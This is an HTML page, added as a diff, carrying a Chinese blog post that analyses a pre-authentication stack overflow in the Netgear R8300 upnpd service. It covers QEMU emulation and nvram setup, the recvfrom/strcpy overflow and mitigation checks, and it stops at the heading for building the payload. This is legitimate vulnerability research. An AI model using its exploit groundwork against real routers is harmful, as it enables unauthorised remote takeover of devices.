@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.8.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"21guns.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[toc] Netgear R8300认证前RCE的漏洞分析及利用准备 通告 NETGEAR has released a fix for a pre-authentication command injection security vulnerability on the following product:（未授权命令注入 R8300 running firmware versions pr">
+<meta name="keywords" content="路由器,漏洞分析,栈溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Netgear R8300认证前RCE的漏洞分析及利用">
+<meta property="og:url" content="http://21guns.top/2021/06/22/iot/Netgear R8300认证前RCE的漏洞分析及利用/index.html">
+<meta property="og:site_name" content="have a nice day">
+<meta property="og:description" content="[toc] Netgear R8300认证前RCE的漏洞分析及利用准备 通告 NETGEAR has released a fix for a pre-authentication command injection security vulnerability on the following product:（未授权命令注入 R8300 running firmware versions pr">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-11-23-004939.jpg">
+<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-11-23-004938.jpg">
+<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-11-23-004937.jpg">
+<meta property="og:updated_time" content="2022-02-21T08:16:46.857Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Netgear R8300认证前RCE的漏洞分析及利用">
+<meta name="twitter:description" content="[toc] Netgear R8300认证前RCE的漏洞分析及利用准备 通告 NETGEAR has released a fix for a pre-authentication command injection security vulnerability on the following product:（未授权命令注入 R8300 running firmware versions pr">
+<meta name="twitter:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-11-23-004939.jpg">
+
+<link rel="canonical" href="http://21guns.top/2021/06/22/iot/Netgear R8300认证前RCE的漏洞分析及利用/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Netgear R8300认证前RCE的漏洞分析及利用 | have a nice day</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">have a nice day</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/06/22/iot/Netgear R8300认证前RCE的漏洞分析及利用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="21Guns">
+      <meta itemprop="description" content>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="have a nice day">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Netgear R8300认证前RCE的漏洞分析及利用
+        </h1>
+
+        <div class="post-meta">
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-06-22 14:41:33" itemprop="dateCreated datePublished" datetime="2021-06-22T14:41:33+08:00">2021-06-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-21 16:16:46" itemprop="dateModified" datetime="2022-02-21T16:16:46+08:00">2022-02-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>[toc]</p>
+<h1 id="Netgear-R8300认证前RCE的漏洞分析及利用"><a href="#Netgear-R8300认证前RCE的漏洞分析及利用" class="headerlink" title="Netgear R8300认证前RCE的漏洞分析及利用"></a>Netgear R8300认证前RCE的漏洞分析及利用</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul>
+<li>通告<ul>
+<li>NETGEAR has released a fix for a pre-authentication command injection security vulnerability on the following product:（未授权命令注入</li>
+<li>R8300 running firmware versions prior to 1.0.2.134（之前的有洞，此修复</li>
+<li>（仅此而已，没有说明哪个程序</li>
+<li>R8300 running firmware versions prior to 1.0.2.134（之前有洞，这个修复</li>
+</ul>
+</li>
+<li>在有设备的情况下，有多种直接获取系统 shell 的方式，如：<ol>
+<li>硬件调试接口，如：UART</li>
+<li>历史 RCE 漏洞，如：NETGEAR 多款设备基于堆栈的缓冲区溢出远程执行代码漏洞<a href="https://www.seebug.org/vuldb/ssvid-98253" target="_blank" rel="noopener">【3】</a></li>
+<li>设备自身的后门，Unlocking the Netgear Telnet Console<a href="https://openwrt.org/toh/netgear/telnet.console#for_newer_netgear_routers_that_accept_probe_packet_over_udp_ex2700_r6700_r7000_and_r7500" target="_blank" rel="noopener">【4】</a></li>
+<li>破解固件检验算法，开启 telnet 或植入反连程序。</li>
+</ol>
+</li>
+<li>无设备<ul>
+<li>理论上，只要 CPU 指令集对的上，就可以跑起来，</li>
+<li>所以我们还可以利用手头的树莓派、路由器、摄像头的开发板等来运行。</li>
+<li>最后一个就是基于 QEMU 的指令翻译</li>
+</ul>
+</li>
+<li>文件夹对比找到有漏洞的二进制<ul>
+<li>win的ultraCompare、Linux的meld（均不建议</li>
+<li>自写py脚本</li>
+<li>收集关键二进制及其目录，如upnpd、httpd，如/usr/sbin</li>
+</ul>
+</li>
+<li>file usr/sbin/upnpd：ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped<ul>
+<li>LSB：小端</li>
+<li>ARM, EABI5： <code>ARMv5</code> 架构</li>
+<li>dynamically linked：动态链接</li>
+<li>stripped：去除了符号表</li>
+</ul>
+</li>
+<li>其他<ul>
+<li>armel和armhf都是小端，hf-hard float，需要硬件支持，可简单理解为后者比前者新（使用时未发现区别</li>
+<li>qemu所需镜像：<a href="https://people.debian.org/~aurel32/qemu/armhf/" target="_blank" rel="noopener">https://people.debian.org/~aurel32/qemu/armhf/</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="qemu虚拟机"><a href="#qemu虚拟机" class="headerlink" title="qemu虚拟机"></a>qemu虚拟机</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. sudo tunctl -t tap0 -u `whoami`（创建tap接口、需事先sudo apt install uml-utilities</span><br><span class="line">2. sudo ifconfig tap0 192.168.1.1/24（为新创建的tap接口配置IP、配置后ifconfig可见</span><br><span class="line">3. qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 -append <span class="string">"root=/dev/mmcblk0p2 console=ttyAMA0"</span> -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br><span class="line">	（为方便封装在sh文件中、-M vexpress-a9指定架构、-kernel vmlinuz指定内核、-initrd指定init文件、file=指定镜像文件、-net tap指定接口类型，ifname=tap0接口名字、-nographic设置无界面</span><br><span class="line">4. root-root登录</span><br><span class="line">5. ifconfig eth0 192.168.1.2/24（为qemu虚拟机网卡分配IP</span><br><span class="line">6. ping 192.168.1.1（测试连通性</span><br><span class="line">7. tar -cvf 1.tar ./squashfs-root、scp -r 1.tar root@192.168.1.2:/root/（tar+scp传送squashfs-root，或wget+tar+py_server，最好打包</span><br><span class="line">8. mount -t proc /proc ./squashfs-root/proc;mount -o <span class="built_in">bind</span> /dev ./squashfs-root/dev（挂载proc、dev</span><br><span class="line">9. chroot ./squashfs-root/ sh（chroot并开启sh</span><br></pre></td></tr></table></figure>
+<h2 id="模拟运行"><a href="#模拟运行" class="headerlink" title="模拟运行"></a>模拟运行</h2><ol>
+<li>直接运行，没有任何输出，且ps没有</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /usr/sbin/upnpd </span></span><br><span class="line"><span class="comment"># ps |grep upnp |grep -v grep</span></span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>没有报错信息就没法定位，sh脚本搭建调试环境，<a href="https://paper.seebug.org/480/#_5" target="_blank" rel="noopener">https://paper.seebug.org/480/#_5</a></li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 </span></span><br><span class="line"><span class="comment"># cat start_debug.sh </span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">pid=`ps | grep -v grep | grep upnpd | awk <span class="string">'&#123;print $1&#125;'</span>`</span><br><span class="line"><span class="keyword">if</span> [ ! <span class="variable">$pid</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">/usr/sbin/upnpd</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">./gdbserver-7.7.1-armel-eabi5-v1-sysv --attach :1234 `ps | grep -v grep | grep upnpd | awk <span class="string">'&#123;print $1&#125;'</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 </span></span><br><span class="line"><span class="comment"># [  ]表示条件测试。注意这里的空格很重要。要注意在'['后面和']'前面都必须要有空格</span></span><br><span class="line"><span class="comment"># 等号左右不能有空格，pid=`ps | grep -v grep | grep upnpd | awk '&#123;print $1&#125;'`</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 </span></span><br><span class="line"><span class="comment"># 选择对应的gdbserver：gdbserver-7.7.1-armel-eabi5-v1-sysv</span></span><br><span class="line">$ file usr/sbin/upnpd </span><br><span class="line">usr/sbin/upnpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line">$ file gdbserver-7.7.1-armel-eabi5-v1-sysv </span><br><span class="line">gdbserver-7.7.1-armel-eabi5-v1-sysv: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, <span class="keyword">for</span> GNU/Linux 2.6.26, BuildID[sha1]=589acbdf7b460493b7e40d618c5389a0a2dc24e1, with debug_info, not stripped</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 </span></span><br><span class="line"><span class="comment"># 查看gdbserver用法</span></span><br><span class="line">qemu-arm gdbserver-7.7.1-armel-eabi5-v1-sysv --<span class="built_in">help</span></span><br><span class="line">Usage:</span><br><span class="line">	gdbserver [OPTIONS] --attach COMM PID</span><br><span class="line">COMM may either be a tty device (<span class="keyword">for</span> serial debugging), or HOST:PORT to listen <span class="keyword">for</span> a TCP connection.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line"><span class="comment"># ./start_debug.sh</span></span><br><span class="line"><span class="comment"># 总是打印gdbserver帮助信息，就是upnp没执行起来，ps+grep+awk没找到pid</span></span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>找报错信息2法：sh+gdbserver搭建调试环境、qemu的–strace选项</li>
+<li>qemu 添加<code>--strace</code>选项, 方便查看错误信息, 便于环境修复：<a href="https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/" target="_blank" rel="noopener">https://cq674350529.github.io/2020/09/16/PSV-2020-0211-Netgear-R8300-UPnP栈溢出漏洞分析/</a></li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line">cp $(<span class="built_in">which</span> qemu-arm-static) .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># chroot与qemu的-L选项还是有区别的</span></span><br><span class="line">sudo chroot . ./qemu-arm-static --strace ./usr/sbin/upnpd</span><br><span class="line">4147 open(<span class="string">"/var/run/upnpd.pid"</span>,O_RDWR|O_CREAT|O_TRUNC,0666) = -1 errno=2 (No such file or directory)</span><br><span class="line">4147 <span class="built_in">exit</span>(2)</span><br><span class="line"></span><br><span class="line">sudo ./qemu-arm-static -L . --strace ./usr/sbin/upnpd</span><br><span class="line">4153 setsockopt(3,0,35,-76392,8,1900) = -1 errno=19 (No such device)</span><br><span class="line">4153 <span class="built_in">exit</span>(1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 先用chroot法，mkdir后再运行</span></span><br><span class="line">lrwxrwxrwx  1 lxl lxl       7 Nov  9 09:53 var -&gt; tmp/var</span><br><span class="line">mkdir -p tmp/var/run</span><br><span class="line"></span><br><span class="line">4160 setsockopt(3,0,35,-76392,8,1900) = -1 errno=19 (No such device)</span><br><span class="line">4160 <span class="built_in">exit</span>(1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line"><span class="comment"># chroot + mkdir == —L的结果，因此倾向—L</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line"><span class="comment"># 要解决nvram的问题，需要交叉编译libnvram，暂搁置//here</span></span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li>qemu找到原因，mkdir -p tmp/var/run解决，继续qemu虚拟机中（<a href="https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c" target="_blank" rel="noopener">https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c</a></li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 固件模拟时很常见的nvram问题</span></span><br><span class="line">/usr/sbin/upnpd </span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 现成的模拟nvram：https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 交叉编译，尽管有warning但是成功了</span></span><br><span class="line">/opt/cross_compile/armv5l/bin/armv5l-gcc -Wall -fPIC -shared custom_nvram_r6250.c -o nvram.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line"><span class="comment"># 缺少dlsym</span></span><br><span class="line">LD_PRELOAD=<span class="string">"/nvram.so"</span> /usr/sbin/upnpd</span><br><span class="line">/usr/sbin/upnpd: can<span class="string">'t resolve symbol '</span>dlsym<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ grep -r "dlsym" .</span></span><br><span class="line"><span class="string">Binary file ./lib/libdl.so.0 matches</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ readelf -a ./lib/libdl.so.0 | grep dlsym</span></span><br><span class="line"><span class="string">26: 000010f0   296 FUNC    GLOBAL DEFAULT    7 dlsym</span></span><br></pre></td></tr></table></figure>
+<ol start="6">
+<li>配置/tmp/nvram.ini</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 新建/tmp/nvram.ini</span></span><br><span class="line">LD_PRELOAD=<span class="string">"/nvram.so /lib/libdl.so.0"</span> /usr/sbin/upnpd</span><br><span class="line">[0x00026460] fopen(<span class="string">'/var/run/upnpd.pid'</span>, <span class="string">'wb+'</span>) = 0x01b52008</span><br><span class="line">[0x0002648c] custom_nvram initialised</span><br><span class="line">[0x76f38c9c] fopen(<span class="string">'/tmp/nvram.ini'</span>, <span class="string">'r'</span>) = 0x00000000</span><br><span class="line">Cannot open /tmp/nvram.ini</span><br><span class="line"></span><br><span class="line">touch /tmp/nvram.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 在nvram.ini中填充键值对</span></span><br><span class="line">LD_PRELOAD=<span class="string">"/nvram.so /lib/libdl.so.0"</span> /usr/sbin/upnpd</span><br><span class="line">[0x00026460] fopen(<span class="string">'/var/run/upnpd.pid'</span>, <span class="string">'wb+'</span>) = 0x00cfe008</span><br><span class="line">[0x0002648c] custom_nvram initialised</span><br><span class="line">[0x76e96c9c] fopen(<span class="string">'/tmp/nvram.ini'</span>, <span class="string">'r'</span>) = 0x00cfe008</span><br><span class="line">[nvram 0]  = </span><br><span class="line">Read 1 entries from /tmp/nvram.ini</span><br><span class="line">acosNvramConfig_get(<span class="string">'upnpd_debug_level'</span>) = <span class="string">''</span></span><br><span class="line">[0x0000e1e8] fopen(<span class="string">'/www/Public_UPNP_gatedesc.xml'</span>, <span class="string">'rb'</span>) = 0x00cfe008</span><br><span class="line">[0x0000e220] fopen(<span class="string">'/tmp/upnp_xml'</span>, <span class="string">'wb+'</span>) = 0x00cfe008</span><br><span class="line">[0x0000f520] acosNvramConfig_get(<span class="string">'lan_ipaddr'</span>) = <span class="string">''</span></span><br><span class="line">[0x76dd2838] acosNvramConfig_get(<span class="string">'hwrev'</span>) = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cat tmp/nvram.ini </span></span><br><span class="line">upnpd_debug_level=9</span><br><span class="line">lan_ipaddr=192.168.1.2</span><br><span class="line">hwver=R8500</span><br><span class="line">friendly_name=R8300</span><br><span class="line">upnp_enable=1</span><br><span class="line">upnp_turn_on=1</span><br><span class="line">upnp_advert_period=30</span><br><span class="line">upnp_advert_ttl=4</span><br><span class="line">upnp_portmap_entry=1</span><br><span class="line">upnp_duration=3600</span><br><span class="line">upnp_DHCPServerConfigurable=1</span><br><span class="line">wps_is_upnp=0</span><br><span class="line">upnp_sa_uuid=00000000000000000000</span><br><span class="line">lan_hwaddr=AA:BB:CC:DD:EE:FF</span><br><span class="line"><span class="comment"># lan_ipaddr要改成自己对应的</span></span><br></pre></td></tr></table></figure>
+<ol start="7">
+<li>成功</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打印信息的同时，也可以输入命令</span></span><br><span class="line">LD_PRELOAD=<span class="string">"/nvram.so /lib/libdl.so.0"</span> /usr/sbin/upnpd</span><br><span class="line">ps |grep upnpd</span><br><span class="line"> 2513 0          3292 S   /usr/sbin/upnpd </span><br><span class="line"> 2522 0          1296 S   grep upnpd</span><br></pre></td></tr></table></figure>
+<ol start="8">
+<li>小结<ol>
+<li>sh脚本+gdbserver搭建调试环境</li>
+<li>qemu的strace选项</li>
+<li>交叉编译nvram.so</li>
+<li>编辑nvram.ini</li>
+</ol>
+</li>
+</ol>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ol>
+<li>/usr/sbin/upnpd，1900端口</li>
+<li>recvfrom()、strcpy()</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://man7.org/linux/man-pages/man2/recvfrom.2.html</span></span><br><span class="line">recv, recvfrom, recvmsg - receive a message from a socket</span><br><span class="line">ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,</span><br><span class="line">                        struct sockaddr *src_addr, socklen_t *addrlen);                     </span><br><span class="line"><span class="comment"># 从socket中接受长度为len的数据，保存到buf中</span></span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>IDA看成因（而非ghidra，ida可变量高亮、看出局部变量大小</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 接受长度为0x1FFFu的数据，保存到v54</span></span><br><span class="line">v27 = recvfrom(dword_C4580, v54, 0x1FFFu, 0, (struct sockaddr *)&amp;v62, (socklen_t *)&amp;v70);</span><br><span class="line"><span class="comment"># 2 v54作为参数1传入</span></span><br><span class="line">sub_25E04(v54, (int)&amp;v58, (unsigned __int16)(HIWORD(v62) &lt;&lt; 8) | (unsigned __int16)(HIWORD(v62) &gt;&gt; 8));</span><br><span class="line"><span class="comment"># 3 局部变量大小 0x634 - 0x58 = 0x5dc，小于0x1FFFu</span></span><br><span class="line">signed int __fastcall sub_25E04(const char *a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v40; // [sp+24h] [bp-634h]</span><br><span class="line">  int s; // [sp+600h] [bp-58h]</span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  strcpy((char *)&amp;v40, v3);</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol>
+<li>通过 <code>checksec</code> 可知程序本身只开了 NX 保护，从原漏洞详情得知 R8300 上开了 ASLR</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lxl@ubuntu:~/Desktop/8/squashfs-root$ checksec usr/sbin/upnpd</span><br><span class="line">[*] <span class="string">'/home/lxl/Desktop/8/squashfs-root/usr/sbin/upnpd'</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br><span class="line"><span class="comment"># NX是针对程序的，ASLR是针对设备/系统的</span></span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>构造payload</li>
+</ol>
